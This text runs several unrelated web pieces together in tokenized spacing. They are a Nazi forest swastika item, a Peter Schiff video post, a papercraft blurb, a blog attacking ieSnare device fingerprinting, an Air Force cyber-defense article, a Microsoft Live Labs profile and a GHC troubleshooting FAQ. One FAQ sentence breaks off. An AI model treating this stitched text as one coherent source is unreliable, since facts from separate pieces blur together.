NAZIs planted trees of contrasting colour in the shape of swastikas in various forests around Germany .
The forest swastika was a patch of carefully arranged larch trees covering a 3,600 m2 ( 4,300 sq yd ) area of pine forest near Zernikow , Uckermark district , Brandenburg , in northeastern Germany .
The reason behind the planting of the trees is unclear , but it has been suggested that it was laid out in 1937 by locals to prove their loyalty after a businessman in the area was denounced and sent to a concentration camp by the Nazi Party for listening to the BBC , or that a zealous forester convinced local Hitler Youth members to plant the trees in commemoration of Adolf Hitler ’s birthday .
For a few weeks every year in the autumn and in the spring , the colour of the larch leaves would change , contrasting with the deep green of the pine forest .
The short duration of the effect combined with the fact that the image could only be discerned from the air and the relative scarcity of privately owned aeroplanes in the area meant that the swastika went largely unnoticed after the fall of the Nazi Party and during the subsequent Communist rule .
However , in 1992 , the reunified German government ordered aerial surveys of the state - owned land .
The photographs were examined by forestry students , who immediately noticed the design .

I wonder what the other blowhard pundits seen here have to say about making fun of Euro Pacific Capital president Peter Schiff 's accurate predictions in 2006 and 2007 about the economic meltdown and its causes ?
( Ben Stein should probably stick to his subject of expertise , which is claiming that " science leads you to killing people " )
This video sequence offers a compendium of appearances ( covering the 2006 - 2007 period ) by Euro Pacific Capital president Peter Schiff , who is a frequent — and frequently disrespected — talking head on cable news shows .
What astonishes is not just the accuracy of his dour predictions about the economy but the sheer arrogance of every other person appearing on these programs .
I do n't know who comes off as worse — the supremely snotty Ben Stein , or the well - named Arthur Laffer .
I just wonder how Ben Stein feels about the financial markets as an investment now .
This is an astonishing compilation of clips .
It just keeps getting more outrageous as it goes along .
Every time Schiff says something sensible , the pundits surrounding him snort and howl .
They treat him with undisguised contempt and hatred , as though he had just called for ending the laws against homicide or reducing the age of consent to three .
Howl ’s Moving Castle Papercraft Well Worth the Death of Ninety - Seven Trees
Flickr user papekura is quite the papercraft artisan , as you can see in her photostream .
But this model inspired by Howl ’s Moving Castle–one of the few , delightful Japanese anime flicks that does n’t confuse me to the point of eye - crossing exhaustion –more - than - stretches expectations for what can be produced with :
… a lot of x-acto knife blades , tons of patience , [ and ] fifty sheets of paper
Damn .
And I was excited when I finally figured out how to make a ninja star out of two sheets of notebook paper .
Of course , you ca n’t poke somebody ’s eye out with a big , freaky castle … so I do n’t feel quite so inferior .
Thanks to Super Punch for the find .

People , for better or worse , have always been a little touchy about unique identifiers .
Social security numbers .
Barcodes .
RFID . GUIDs .
In this day and age of massive registration databases , of drive - by identity theft , a number can be a very powerful thing .
You may remember the sound and fury over the Pentium III processor 's embedded serial number , a feature which could have been used ( potentially ) to track a user 's computer without the user 's knowledge or consent .
This was back in 1999 — ancient history — but it was taken quite seriously at the time .
In the United States , the Federal Trade Commission was asked , repeatedly , to investigate the technology as an unfair and deceptive trade practice .
Meanwhile , across the Atlantic , an advisory group to the European Parliament came very close to recommending a complete European ban of the chip .
Intel was and is one of the premiere technology companies in the world .
And yet the message was clear , on both sides of the Atlantic : stay the f --k out of our lives .
Intel was forced to first disable , and then discontinue entirely , the tracking feature .
And you know what ?
In hindsight , the privacy concerns were probably exaggerated .
Computer hardware is and has always been full of unique or semi-unique markers .
That 's how most licensing and registration software works , after all : by taking a look at a couple pieces of hardware and cobbling together a unique key .
Fast forward , ten years later .
Today I 'd like to talk to you about an electronic privacy issue which is a hundred times more serious than the Pentium III , and a hundred times less publicized .
This technology , which exists today , and which quite possibly is working its deceptive magic on your computer even as you read this , is exactly what the world was worried about when the Pentium III was introduced .
Back then , the privacy concerns were unfounded .
Today , not so much .
Read on .
Imagine , if you will , that your computer has been branded with a unique identifier , very similar to the one introduced with the Pentium III .
Only this unique identifier is n't associated with a particular piece of hardware ; it 's associated with your entire machine — the one you 're using to read this , and who knows , maybe the one your kid uses .
You can change your CPU ; does n't matter .
Reformat your hard drive ; does n't matter .
The identifier persists .
And this is where it gets scary .
Let 's imagine that this " computer barcode " was distributed across the Internet without your knowledge or consent , linked into a massive online database containing some 60,000,000 unique device identifiers , each one representing a personal computer somewhere in the world : yours , mine , your next door neighbor 's , your cousin's in Tuscaloosa , your uncle 's in Paris .
And let 's assume that this database was billed as " fraud prevention " technology , but that it was maintained by a private company selling their services — access to this database — for cold , hard cash .
With zero oversight .
Zero regulation .
Zero anything .
Would it bother you ?
Because , ladies and gentlemen , this technology already exists .
Exactly as described above .
And it 's far more common than you think .
And if you 're reading this article , there 's a better than average chance that you 've already been infected with it ( and " infected , " believe me , is the word ) .
Welcome to the wonderful world of ieSnare .
Sporting a name that smacks of destructive Internet script kiddie hubris , and backed by the resources of a dedicated company by the name of iovation , ieSnare is quietly one of the nastiest , most underhanded pieces of spyware / malware this author has encountered , in a long history of spyware - induced pain and anguish .
It is quite simply a worldwide , online , profit - driven computer blacklist capable of uniquely identifying your machine ( once submitted to the database ) whenever you visit any site , or use any product , protected by the ieSnare system .
In iovation 's own words :
iovation ReputationManager utilizes proprietary methods to uniquely identify devices connected to the Internet , creating unique identification for them that remain constant across all subscribing online businesses .
For example , a PC device connecting to one online gaming or e-commerce site protected by iovation Reputation Manager is assigned a device identifier by the same method used to identify PCs connecting to other e-commerce sites / networks protected by the system .
Hello , Big Brother .
Tellingly , there is no publically available listing of companies who employ ieSnare technology although you can find various mentions and references on Google .
I found out about ieSnare because I noticed that the Full Tilt , Ultimate Bet , and Bodog online poker clients were opening a curious file on my local hard drive :
STM.SOL is what 's known as a Flash local shared object — which is basically a Flash " cookie " .
And unless you 're a web developer , I 'll bet you had no idea that there was even such a thing as a Flash cookie , or that Flash cookies are immune to typical " delete cookie " commands in your web browser .
What 's more , ieSnare sneaks under the radar of most antispy software because Flash cookies are either ignored , or viewed as low - risk items .
Like most successful spyware , ieSnare capitalizes on user ignorance .
Whether or not ieSnare is an acceptable way to prevent fraud and / or increase operational efficiency is a discussion we can have once companies stop trying to slip this technology in through the electronic back door .
And by the way : guess who provides at least some of the funding for iovation ?
Anybody ?
The selfsame company which brought you the Pentium III and the unique identifier that caused such a stir ten years ago : Intel .
What a coincidence .
No matter how things change , it would seem , the more they stay the same .

The Air Force is fed up with a seemingly endless barrage of attacks on its computer networks from stealthy adversaries whose motives and even locations are unclear .
So now the service is looking to restore its advantage on the virtual battlefield by doing nothing less than the rewriting the " laws of cyberspace . "
It 's more than a little ironic that the U.S. military , which had so much to do with the creation and early development of internet , finds itself at its mercy .
But as the American armed forces become increasingly reliant on its communications networks , even small , obscure holes in the defense grid are seen as having catastrophic potential .
Trouble is that even a founding father can't unilaterally change things that the entirety of the internet ecosystem now depends on .
" You can control your own networks , rewrite your own laws , " says Rick Wesson , CEO of the network security firm Support Intelligence .
" You ca n't rewrite everybody else 's . "
But the Air Force Research Laboratory 's " Integrated Cyber Defense " program , announced earlier this month , is part of a larger military effort to accomplish just that .
" The ' laws ' of cyberspace can be rewritten , and therefore the domain can be modified at any level to favor defensive forces , " announces the project 's request for proposals .
Some of the rewrites being considered :
Making hostile traffic inoperable on Air Force networks .
Locating and identifying once - anonymous hackers .
Enabling Air Force servers to evade or dodge electronic attacks , somehow .
It 's part of a larger Air Force effort to gain the upper hand in network conflict .
An upcoming Air Force doctrine calls for the service to have the " freedom to attack " online .
A research program , launched in May , shoots for " gain access " to " any and all " computers .
A new division of information warriors is being set up under Air Force Space Command .
" Our mission is to control cyberspace both for attacks and defense , "
8th
Air Force commander Lt. Gen. Robert Elder told Wired.com earlier this year .
Apparently .
At the moment , though , online aggressors have the edge on the military 's network protectors , the Air Force says .
" Defensive operations are constantly playing ' catch up ' to an ever - increasing onslaught of attacks that seem to always stay one step ahead , " says the Air Force Research Laboratory 's " Integrated Cyber Defense " request for proposals .
" In order to tip the balance in favor of the defender , we must develop a strategic approach to cyber defense that transcends the day to day reactive operations . "
" [ M ] ost threats should be made irrelevant by eliminating vulnerabilities beforehand by either moving them ' out of band ' ( i.e. , making them technically or physically inaccessible to the adversary ) , or ' designing them out ' completely , " the request for proposals adds .
" Can we create a cyberspace with different rules ? " asks Paul Ratazzi , a technical advisor at the AFRL's Information
Directorate .
" Let 's challenge those fundamental assumptions on how these things work , and see if there 's a better way . "
For instance , it 's extraordinarily difficult to find the hacker behind a cyberattack today .
Network traffic can be run through dozens of different proxies and anonymizers ; " botnets " of enslaved computers can be controlled from the other side of the world ; millions of PCs spew out malicious data without their owners ever catching on .
AFRL
would like to see a way to change existing network protocols , to make it easier to trace and locate the source of an online threat .
Or perhaps today 's protocols can be tailored , to make military networks " technically or physically inaccessible " to malicious traffic .
" We 'll start with blue , " says Information Directorate chief Donald Hanson , using the military term for friendly forces .
" If you 're not blue , you can't come in . "
Hanson is also interested in finding ways to dodge electronic attacks , rather than figure out new ways to stop them , or lock them out .
" A lot of our [ defenses ] up to now have been about defeating an attack , " he says .
" We 'd rather avoid it altogether . "
Digital radios communicate today by " frequency - hopping " – jumping across multiple bands of the spectrum .
Perhaps the Air Force 's online traffic could do something similar .
There are some network precedents for the idea , Wesson explains .
So - called " honeypot " servers are used to lure in hackers with fake targets to attack .
But the hackers are often aware which IP addresses are really honeypots .
So hosted servers are used to mask those addresses – and , with a secure network " tunnel , " run the traffic back to the honeypots .
" If you can do that with honeypots , you can do it with all kinds of other things , " Wesson says .
Hanson refused to comment on that technique .
But Ross Stapleton - Gray , with the Packet Clearing House research group , is n't sure cyberstrikes can be avoided , really .
" The way networks work , it 's always going to be easier for a nimble attacker than a nimble defender , " says Ross Stapleton - Gray , with the Packet Clearing House research group .
" There 's always a scarcity of bandwidth – somewhere .
There are always chokepoints – somewhere . "

“ Can I get you a Coke ? ” Bill Gates asked .

It was 2005 , and Gary William Flake , the head of research for Yahoo , was visiting Microsoft .
Finally .
Senior executives had been calling for a year , trying to coax him to come meet a few people , hear them out .
But Flake thought he already had the best job in the industry .
He had n’t agreed to fly from his home in San Jose , California , to Redmond , Washington , and trade up from his usual T - shirt , until he heard that Gates wanted to meet .
That was an offer no self - respecting geek could turn down .
Now here was Gates , greeting him outside his office .
The world ’s best - known and wealthiest technologist , taking his drink order .
Why the royal wooing ?
Flake had been the chief science officer at Overture , where he had helped build the advertising - search technology that became the dominant Internet business model .
Google exploited it better than anyone else .
Yahoo had wanted it so badly that it acquired Overture .
Now Microsoft wanted to acquire Flake .
But it was n’t his only suitor .
Days before meeting Gates , he ’d had breakfast with Google cofounder Larry Page .
“ Are you serious about going to Microsoft ? ” Page asked .
Flake said he was n’t .
Then he sat down with Gates , who sipped a Diet Coke and shooed away his handlers when the scheduled hour was up .
They talked for 45 more minutes .
Flake had intended to pick Gates ’s brain , but it turned out the Microsoft founder wanted to pick his .
About Internet search and online advertising .
How Microsoft , the ultra - disciplined and occasionally plodding maker of desktop software , could turn its advanced research into actual products more quickly — generating the sort of dazzling Web breakthroughs Microsoft is n’t known for .
How the company needed someone to inject a dose of inventiveness that could transform the Microsoft culture into something more agile and adaptable .
“ The humility and candidness stunned me , ” Flake recalls .
advertisement
After the meeting , he called his wife to share an unexpected realization : “ I think I want to work for Microsoft . ”
Microsoft ’s desktop applications and platforms still generate the vast majority of the company ’s $ 17.7 billion annual profit .
Its products run more than 90 % of the world ’s personal computers .
That ’s what the company is built around , what most of its 92,000 employees focus on .
So it ’s not surprising that Microsoft has been slow to pursue other technologies , especially ones that could potentially disrupt its money machine or that lack a clear business model .
The flip side of this focus , of course , is that Microsoft has fallen far behind on some of the biggest tech growth industries .
CEO Steve Ballmer has said that Microsoft ’s future lies in ad sales , not software sales .
He ’s laid out a vision of “ software plus services , ” desktop applications combined with Internet features .
Meanwhile , the likes of Google , Facebook , and Apple have gotten big head starts , running away with the dominant models in Web search , social networking , and online music distribution .
Those companies , not Microsoft , are most often praised as innovators .
To Flake , 41 , a techie steeped in experimentation and risk taking who calls himself “ Dr. Flakenstein ” on his blog , that paradox represents a “ historic ” opportunity — not just to bring Microsoft up to speed but to advance radically the Internet experience .
He ’s not interested in making incremental improvements , he says , but rather the kind of great technological leaps that Microsoft is going to need to create visually arresting applications that offer new ways of organizing and displaying information on the Web .
In Microsoft ’s unparalleled reach — more than a billion computer users worldwide —
Flake sees an unparalleled collective power ; the more people contribute data to a site , he says , the richer it becomes for each user .
This powerful network effect is as thrilling to him as an elegant mathematical solution .
It represents Microsoft ’s advantage .
Microsoft gave
Flake the rare and influential role of technical fellow — a kind of free - ranging visionary with the clout of a corporate vice president .
He was the first outsider to be given that distinction from day one .
In January 2006 , Flake started Live Labs , a rapid - development Web team that exists outside of any specific product group .
As he told Microsoft executives last year , paraphrasing the new team ’s manifesto , “ Despite all of the hype that has been somewhat omnipresent with the Internet over the past couple of years , we are still fundamentally undervaluing the total proposition that it represents to society , and all the various industries that connect to it . ”
Flake reports to Ray Ozzie , a kindred Internet spirit who was hired in early 2005 as chief technical officer .
Under Ozzie , Microsoft has launched several innovation labs to create new products for groups such as adCenter and Microsoft Office .
Flake ’s Live Labs is the largest , with 170 researchers , developers , engineers , and designers , about half of whom come from various product groups .
It ’s also the most independent , less bound by the usual rules .
“ We were the first that could take raw research to a product release , soup to nuts , ” says Flake .
advertisement
In less than three years , Live Labs has launched dozens of new technologies ( and Flake has filed for more than 100 patents ) .
Some launches take mere weeks , lightning fast for a company with multiyear development cycles ; those tend to be new features for existing software .
Several stand - alone products have also rolled out , or are about to .
Volta is a Web - based service that facilitates complex software programming .
Political Streams charts political blog activity with an interface similar to a stock chart ; it ’s part of an eventual blog - analysis product that will identify and track the most - popular Internet memes .
And in August , to Google - like buzz , Live Labs released Photosynth , a Web application that offers an entirely new way to view photos online by turning everyday snapshots into 360 - degree virtual worlds .
( The current version allows you to create a 3 - D “ synth ” using only your own photos ; later versions will allow you to crowd - source everyone else ’s images of the same place . )
The Photosynth launch illustrates Flake ’s guiding principles of the Web .
Thanks to the network effect , ultimately there will be more photos of more places , more ingredients for collaboration , more experiences for people to share .
Flake believes that the Internet is becoming a mirror of the physical world .
He calls Photosynth “ one - and - a - half life , ” a semi-synthetic world between Second Life and real life .
But Flake thinks his group ’s most substantial impact will be as a “ perpetual startup ” that spawns other startups .
Since Live Labs is n’t tied to a specific product group , it ’s positioned to reverberate throughout Microsoft , releasing its new technologies and teams to other divisions and , in the process , prodding Microsoft ’s culture .
“ Success , ” Flake says , “ is getting kicked out of Live Labs . ”
As his nickname suggests , Flake is a bit of a mad scientist , with perpetually tousled hair , a penchant for obscure pop-culture references , and major geek cred :
He taught himself how to code at 11 , and in his twenties , after penning his PhD dissertation on machine learning , he spent three years writing a computer - science textbook .
The Computational Beauty of Nature explores the work of thinkers from Sir Isaac Newton to the fifth - century Greek philosopher Zeno , as well as how neurons process information in the brain and the behavior of ants .
When word of Flake ’s hiring at Microsoft hit the nerd grapevine , it was as if he had betrayed some unwritten compact among hard - core coders .
As someone posted on the tech - news site Slashdot , “ Fallen to the dark side , young Flake has . ”
“ A younger version of myself might have also looked at the world in those black - and - white terms — Apple versus Microsoft , ” Flake says .
“ But I ’ve been around the block , and I ’ve come to realize that what I thought was good and evil is not .
There are many more subtleties , and it ’s a more interesting world because of that . ”
He sees the challenge of creating new technologies and businesses at Microsoft not as a function of inability or misguidedness , but as a failure of process .
As director of Live Labs , he ’s not only trying to innovate .
He ’s trying to create the best methodology for innovation , which Microsoft ’s other labs can adopt .
advertisement
Flake is focused on repairing what he considers a critical shortcoming at the company , the gap between researchers and product engineers .
Typically , the former explore technology long term as if they ’re at a university ; the priority is publishing papers .
Meanwhile , engineers concentrate on customer needs , reliability , and long development cycles , leaving little time to experiment and little incentive to take chances .
Live Labs acts as a bridge between the two , he says .
Flake ’s staffers are , as he poetically puts it , “ human Rosetta stones ” — meaning they speak the languages of scientists as well as pragmatists .
“ By using rapid prototyping , by uniquely bridging research and engineering , ” says Ozzie , Live Labs “ has proven to be a novel and effective method for new idea incubation . ”
Live Labs ’ “ startup factory ” consists of small teams of two or three researchers and engineers who apply for early short - term funding to develop an idea , like a startup seeking seed money .
To avoid perpetuating subpar projects ( a common flaw in internal incubators ) , the system is set up so that early funding does n’t guarantee further rounds .
Last year , Flake and his senior staff killed a project called Listas , for instance , a list - management application that had been in the works for months .
The rejection was considered proof that people were taking chances and that the bar was appropriately high .
Flake demonstrated to his team early on that it was okay to take risks .
He wanted Live Labs to have an office in downtown Seattle .
Instead of going through channels , he found a loftlike space on his own — defying the warnings of other execs that locating off campus was “ suicide . ”
Now it ’s the envy of Microsoft , with a living room / screening room and an orange - wallpapered meeting space known as the “ bordello . ”
Similarly , when MSN , the company ’s Web portal , would n’t promote Photosynth on its home page unless it was rebranded using an MSN name , Web address , and logo , Live Labs launched the service solo .
“ We ’re like a tightrope walker , between acting like a startup and managing relationships within Microsoft , ” says Alex Daley , 29 , Live Labs ’ group product manager .
Daley has solid geek cred of his own :
As a junior at Rutgers , he taught computer - science classes , and he was managing the university ’s IT - services department by graduation .
“ I make sure we get what we need from the rest of the company without it getting in our way . ”
It ’s as if the alpha geeks are slyly trying to reprogram the company .
And indeed , on the whiteboard in Flake ’s office , a colleague has taped the cover of a recent issue of Fast Company , with a picture of Flake ’s face superimposed on it .
The story in that issue was about an ad agency hired to rebrand the company , but the cover line could apply to Flake just as well : “ Can This Dude Make Microsoft Cool ? ”
To understand the challenges facing Flake and Live Labs , there ’s no better example than Photosynth .
The project began after Flake acquired Seadragon , a Web startup whose founder , Blaise Agüera y Arcas , 33 , had spent years figuring out how to easily display and navigate huge amounts of visual information .
Seadragon can show an aerial view of every page of a book on one screen , then zoom in as close as an individual letter in the text — all in high resolution .
advertisement
The acquisition , made two months after Live Labs began , gave the little - known team a “ shiny object ” to tantalize product groups , says Brett Brewer , Flake ’s director of incubations and a 10 - year veteran of Microsoft .
It also demonstrated how Flake could use Live Labs as a recruiting tool , attracting Internet coders who think outside Microsoft ’s business model .
( Agüera y Arcas ’s geek cred :
He started Seadragon at 27 and was recently named one of Technology Review ‘s top innovators under 35 . )
Photosynth came together after Agüera y Arcas attended Microsoft Research ’s annual showcase and saw a 3 - D model made from snapshots .
A trio of researchers at Microsoft and the University of Washington had written software to recognize the same objects in multiple photos , calculate the depth of field , and stitch the images together .
To turn that research into a seamless consumer experience that happens in seconds on any given laptop — instead of days on a supercomputer — Agüera y Arcas formed a team of 15 that raced to create a bare - bones prototype in 2007 to get early feedback from the tech community .
Photosynth epitomizes Ballmer ’s “ software plus services ” strategy .
The photos are stored online , in “ the cloud , ” at Microsoft , while the software performs the data - crunching necessary to synthesize the 3 - D rendering on a user ’s computer .
Photosynth conveys a noticeable flair for design that ’s unusual for Microsoft .
The reason :
The ratio of engineers to designers at Live Labs is 10 to 1 , not the usual 100 or so to 1 .
And thanks to Flake , product managers do n’t automatically have the final say on design .
“ I ’m not saying working with Gary is like working with Steve Jobs , ” says Don Lindsay , an Apple veteran who had decided to leave Microsoft until he encountered Flake and joined his team as design director .
“ But Gary is pretty close . ”
Still , the question remains as to Live Labs ’ — and by extension Flake ’s — broader impact .
Photosynth , like most new Web services , is free , its business model a work in progress .
“ How does it make money ? ” Flake says .
“ There are so many ways .
You could link to stores that appear in photos , or individual products , and display an ad or turn it into a commerce event .
Imagine what this does for real estate and hotels and tourist attractions . ”
Even if Photosynth does take off , it ’ll still deliver a pittance compared with Windows and Office .
But Flake is unconcerned .
Live Labs , he insists , is about generating multiple projects and leaders that have a cumulative impact throughout the company , financially , technologically , and culturally .
“ Whenever you make an effort like this , of course you ’re going to encounter skepticism , ” Flake says .
“ There ’s nothing I can do to convince people to have a change of heart , absent good evidence . ”
advertisement
Evidence such as the Photosynth team tripling in size following the launch , when it relocated to MSN .
( Plans are under way to incorporate it into various channels , such as Virtual Earth . )
And evidence that Live Labs ’ innovation model is spreading to other parts of Microsoft .
Agüera y Arcas , now a leading architect at MSN , is launching an applied research lab , and Ozzie , Flake ’s boss , has created a new startup lab in Boston .
Both are modeled on the Live Labs methodology .
It ’s early , but Dr. Flakenstein ’s creation is up and walking .

Please feel free to add stuff here .
This page is rather long .
We 've started to add some sub - headings , but would welcome your help in making it better organised .
GHC ( Platform - specific Issues )
Porting GHC
How do I port GHC to platform X ?
There are two distinct possibilities : either
The hardware architecture for your system is already supported by GHC , but you 're running an OS that is n't supported ( or perhaps has been supported in the past , but currently is n't ) .
This is the easiest type of porting job , but it still requires some careful bootstrapping .
Your system 's hardware architecture is n't supported by GHC .
This will be a more difficult port ( though by comparison perhaps not as difficult as porting gcc ) .
Both ways require you to bootstrap from intermediate HC files : these are the stylised C files generated by GHC when it compiles Haskell source .
Basically the idea is to take the HC files for GHC itself to the target machine and compile them with gcc to get a working GHC , and go from there .
The Building Guide has all the details on how to bootstrap GHC on a new platform .
Linux - related
Missing libreadline.so.x
Errors
I Can't run GHCi on Linux , because it complains about a missing libreadline .
so.3 .
The " correct " fix for this problem is to install the correct package for the particular flavour of Linux on your machine .
If this is n't an option , however , there is a hack that might work : make a symbolic link from libreadline .
so.4 to libreadline .
so.3 in /usr / lib .
We tried this on a SuSE 7.1 box and it seemed to work , but YMMV .
Linking Errors
Linking a program causes the following error on Linux : /usr / bin/ld : cannot open - lgmp : No such file or directory
The problem is that your system does n't have the GMP library installed .
If this is a RedHat distribution , install the RedHat - supplied gmp - devel package , and the gmp package if you do n't already have it .
There have been reports that installing the RedHat packages also works for SuSE ( SuSE does n't supply a shared gmp library ) .
SELinux - related
Memory Allocation Errors
If you have SELinux enabled on your system , then GHC may fail with a memory allocation error :
ghc - 6.4.1 : internal error : mallocBytesRWX : failed to protect 0x0x1660730
or maybe
ghc : internal error : getMBlock : mmap : Permission denied
The reason for this is that SELinux prevents allocation of writeable / executable memory regions , which GHC needs in order to implement certain parts of the FFI that require dynamic code generation .
( See this bug report ) .
In GHC 6.4.2 we improved the situation somewhat , but not completely .
Workarounds :
Set allow_execmem to 0 , with the setsebool command .
to 0 , with the command .
do this on a per- program basis , for GHC and GHC - compiled programs .
Apparently this is done by :
/usr/bin/chcon -t unconfined_execmem_exec_t /path/to/binary/prog
Solaris - related
Link Errors
Solaris users may sometimes get link errors due to libraries needed by GNU Readline .
We suggest you try linking in some combination of the termcap , curses and ncurses libraries , by giving - ltermcap , - lcurses and - lncurses respectively .
If you encounter this problem , we would appreciate feedback on it , since we do n't fully understand what 's going on here .
The build fails in readline .
It has been reported that if you have multiple versions of the readline library installed on Linux , then this may cause the build to fail .
If you have multiple versions of readline , try uninstalling all except the most recent version .
Windows - related
Heapsize - related Crashes
My program that uses a really large heap crashes on Windows .
For utterly horrible reasons , programs that use more than 128 Mb of heap wo n't work when compiled dynamically on Windows ( they should be fine statically compiled ) .
Ctrl - C Not Working
When running GHC under a Cygwin shell on Windows , Ctrl - C sometimes does n't work .
A workaround is to use Ctrl - Break instead .
Another workaround is to use the rlwrap program ( cygwin package available ) to invoke ghci :
In addition to proper Ctrl - C , you also get emacs ( or vi ) key bindings and command history across sessions .
Linking with Visual Studio C++ Code
How do I link Haskell with C++ code compiled by Visual Studio ?
Prerequisites
It is assumed that the reader is familiar with the Haskell Foreign function interface ( FFI ) , and is able to compile Haskell programs with GHC and C++ programs with Visual Studio .
Background
GHC has two modes of code generation .
It either compiles Haskell straight into object code ( native mode ) , or translates Haskell into intermediate C code , and uses a C compiler as backend .
The Windows distribution of GHC comes bundled with the GCC compiler , which is used as backend .
That 's why linking Haskell with Visual C++ is no different from linking GCC - generated code with the code generated by Visual C++.
One cannot statically link together object files produced by those two compilers , but they can be linked dynamically : an executable produced by Visual C++ can invoke a DLL produced by GCC , and vice versa .
Likewise , we can link Haskell with Visual C++ in one of these ways .
Note : when Haskell becomes able to use Visual C++ as a backend ( see [ 1 ] ) , we would not need to go via a DLL anymore .
Instead , we would simply list all source files ( Haskell and C++ ) on the command line of GHC .
Invoking a Haskell DLL
From a C++ executable
Make a Haskell DLL as explained in [ 2 ]
Make a module definition file , such as
LIBRARY Adder
EXPORTS
adder Create an import library using Visual Studio 's lib.exe :
lib /DEF:adder.def /OUT:adder.lib
Link the C++ program against the import library .
From a Haskell executable
Make a DLL project in Visual Studio .
It will create a .vcproj and .sln files for you .
Add your C++ source files to this project .
Create a .def file for your DLL .
It might look like
LIBRARY MyDLL
EXPORTS
function1
function2
where function1 and function2 are the names of the C++ functions that you want to invoke from Haskell ( there can be more of them , of course ) , MyDLL is the name of your DLL .
Create an import library that can be used by ghc :
dlltool -d MyDLL.def -l libMyDLL.a
Link your Haskell project , adding the library :
ghc -- make main.hs - optl - lMyDLL - optl - L .
mind the dot at the end of the command line !
( - optl switch passes its argument as an option to the linker ) .
GHCi Hanging Issues
GHCi hangs after " Loading package base ... linking ... done . "
On a small number of systems GHCi will fail to start , hanging after loading the base package .
The " Prelude > " prompt is never reached .
This is believed to be due to a bug in Windows thought to affect tablet PCs , although the details are not fully understood .
A workaround is to open a command prompt , enter " chcp 28591 " - if this hangs hit Ctrl - C - and then run " ghci " .
Some users may find this hotfix useful .
A console window opens when my application is supposed to be GUI only
Windows has several different " subsystems " , the default subsystem which the mingw linker uses is console , so that stdout / stderr can be printed on screen and stdin be read from the console window .
This can be solved by giving the option - optl - mwindows with the compile command :
ghc -- make - optl- mwindows MyProgramWithGUI.lhs
With this option , the option - mwindows is passed to the linker .
Caveat : attempting to read from stdin with - mwindows set may cause a runtime error , any output on stdout / stderr will be lost .
.NET/JVM Availability
Why is n't GHC available for .NET or on the JVM ?
It would make a lot of sense to give GHC a .NET or JVM back end , and it's a question that comes up regularly .
The reason that we have n't done it here , at GHC HQ , is because it 's a more substantial undertaking than might at first appear ( see below ) .
Furthermore , it 'd permanently add a complete new back - end platform for us to maintain .
Given our rather limited development effort , we have so far not bitten the bullet , and we have no immediate plans to do so .
It would be a good , well - defined project for someone else to tackle , and we would love to see it done .
There is some good groundwork already done :
Ashley Yakeley worked on a Haskell - JVM bridge
Sigbjorn Finne did a simple interop implementation ( the hs - dotnet package ) that allows a Haskell program to be compiled to native code ( as now ) but to call .NET programs via a variant of the FFI .
I do n't think this work is in active use , and I 'd be surprised if it worked out of the box , but it could probably be revived with modest effort
Andre Santos and his colleagues at UFPE in Brazil are working on a .NET back end , that generates CLR IL , though I do n't know where they are up to .
Nigel Perry and Oliver Hunt have a Haskell .
NET prototype that works using GHC to compile to Core , and then compiling Core to NET .
I 'm not sure what stage it is at .
GHC .
Net would be extra attractive if there was a Visual Studio integration for GHC .
Substantial progress on this has been made in 2004 by Simon Marlow , Krasimir Angelov , and Andre Santos and colleagues .
Brian Alliet created a patch for GHC called LambdaVM that compiles programs into JVM bytecode . [ 3 ]
Not GHC but UHC : the Jazy backend of UHC generates Java class files to allow Haskell programs to run on the Java Virtual Machine ( JVM ) .
Jazy is not fully functional yet .
There may be others that I do n't know of .
If anyone wants to join in this effort , do contact the above folk .
And please keep us informed !
Here 's a summary of why it 's a non-trivial thing to do ( using .NET language , but it mostly applies to the JVM too ) :
The first thing is to generate native CLR Intermediate Language ( IL ) .
That 's not really hard .
Requires thinking about representations for thunks and functions , and it may not be particularly efficient , but it can surely be done .
An open question is about whether to generate verifiable IL or not .
The trouble here is that Haskell 's type system is more expressive than the CLR 's in some ways , notably the use of higher - kinded type variables .
So , to generate verifiable IL one is bound to need some run-time casts , and it 's not clear how to minimise these .
At first blush this is all you need do .
But it is n't !
Next , you need to think about how to inter -operate with .NET libraries .
You do n't really want to write " foreign import ... " for each and every import .
You 'd like GHC to read the CLR meta - data directly .
But there are lots of tricky issues here ; see the paper that Mark Shields and I wrote about " Object - oriented style overloading for Haskell " .
A closely - related question is this : how to make the type systems of Java / .NET and Haskell " line up " ?
For example , when importing a Java procedure , what is the Haskell type that corresponds to its .
NET / JVM type ?
How do you sub-class a .NET class in Haskell ?
For example Object - Oriented Style Overloading for Haskell gives one " take " on the subject , but there are plenty of other possibilities .
Now you need to figure out how to implement GHC 's primitive operations : the I/O monad arbitrary precision arithmetic concurrency exceptions finalisers stable pointers Software transactional memory
Not all of these are necessary , of course , but many are used in the libraries .
The CLR supports many of them ( e.g. concurrency ) but with a very different cost model .
Last , you have to figure out what to do for the libraries .
GHC has a pretty large library , and you either have to implement the primops on which the library is based ( see previous point ) , or re-implement it .
For example , GHC 's implementation of I/ O uses mutable state , concurrency , and more besides .
For each module , you need to decide either to re-implement it using .NET primitives , or to implement the stuff the module is based on .
These challenges are mostly broad rather than deep .
But to get a production quality implementation that runs a substantial majority of Haskell programs " out of the box " requires a decent stab at all of them .
Mac OS X-related
Linking with GHC
Linking with ghc produces ld : Undefined symbols : _sprintf$LDBLStub ...
This happens on a PowerPC Mac OS X 10.4 if gcc -3.3 is the default compiler and you try to compile with a ghc that has been built with gcc - 4.0 .
For example :
$ cat t2.hs module Main where main = putStr ( " t2 : Hello trac 1066 2007 - Feb - 17 19.48
" ) $ gcc --version gcc ( GCC ) 3.3 20030304 ( Apple Computer , Inc. build 1819 ) ... $ ghc -- make t2.hs [ 1 of 1 ] Compiling Main ( t2.hs , t2.o ) Linking t2 ... ld : Undefined symbols : _sprintf$LDBLStub _fprintf$LDBLStub _vfprintf$LDBLStub _sscanf$LDBLStub $
To correct this , set the default compiler to gcc -4.0 ( sudo gcc_select 4.0 ) or include linking options - lHSrts - lSystemStubs in that order on the ghc command :
$ ghc -- make t2.hs - lHSrts - lSystemStubs [ 1 of 1 ] Skipping Main ( t2.hs , t2.o ) Linking t2 ... $
The command
for l in < ghc installation directory >/ lib/ghc -< ghc version >/*.a ; do nm $l 2 > &1 | if grep LDBLStub 1 >/ dev/null ; then echo $ l ; fi ; done

Linking with C++
Linking with a C++ library gives : Undefined symbols : __Unwind_Resume
You need to pass the - fexceptions to the linker .
Use - optl - fexceptions .
Running GHC
Filenames Containing '+'
GHC does n't like filenames containing '+'.
Indeed not .
You could change + to p or plus .
Linking
Why does linking take so long ?
Linking a small program should take no more than a few seconds .
Larger programs can take longer , but even linking GHC itself only takes 3 - 4 seconds on our development machines .
